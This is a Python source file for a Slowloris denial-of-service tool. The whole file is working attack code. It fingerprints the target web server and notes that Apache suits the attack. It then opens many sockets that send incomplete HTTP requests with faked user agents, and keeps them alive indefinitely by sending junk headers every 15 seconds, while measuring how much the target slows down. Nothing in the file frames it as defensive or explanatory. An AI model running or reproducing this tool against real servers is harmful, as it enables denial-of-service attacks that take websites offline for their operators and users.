import socket
import user_agent as ua
from target import Target
import random
import latency
import sys
import time
import logging
import requests
class Connection:

    sockets_list = []
    def __init__(self,target_info):
        self.target_info : Target = target_info

    def retrieve_ws(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        try:
            sock.connect((self.target_info.host, self.target_info.port))
            sock.send("GET / HTTP/1.1\r\n\r\n".encode("ascii"))
            response = sock.recv(1024).decode("utf-8")
            sock.shutdown(1)
            sock.close()
        except: 
            print("No Webserver detected, please verify your target adresse")
            sys.exit()
            return None
        for line in response.split("\r\n"):
            if line.startswith("Server:"):
                ws = line.split("Server:")[1].strip()
                if ws.startswith("Apache"):
                    print("[{}] server running with Apache, best configuartion for this attack".format(self.target_info.host))
                else:
                    print("[{}] serveur running with {} , Not best configuration".format(self.target_info.host,ws))
        return None
    
    def init_socks(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.target_info.host, self.target_info.port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(ua.USER_AGENTS[0]).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def test_initial_latency(self,latence):
        response = requests.get(latence.url).elapsed.total_seconds()
        self.target_info.latency = response


    def start_attack(self):
        latence = latency.Latency(self.target_info)
        latence.start()
        print("initial latency : {}".format(self.test_initial_latency(latence)))

        for _ in range(self.target_info.sockets_number):
            try:
                s = self.init_socks()
            except socket.error as e:
                print(e)
                break
            self.sockets_list.append(s)
        print("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
        while True:
            try:
                print("Sending header with {} sockets".format(len(self.sockets_list)))
                for s in list(self.sockets_list):
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        self.sockets_list.remove(s)
                
                print("try recreating sockets")
                for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
                    try:
                        s = self.init_socks()
                        if s:
                            self.sockets_list.append(s)
                    except socket.error as e:
                        print(e)
                        break
                print("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))

                time.sleep(15)

            except (KeyboardInterrupt, SystemExit):
                print("Stopping Slowloris")
                break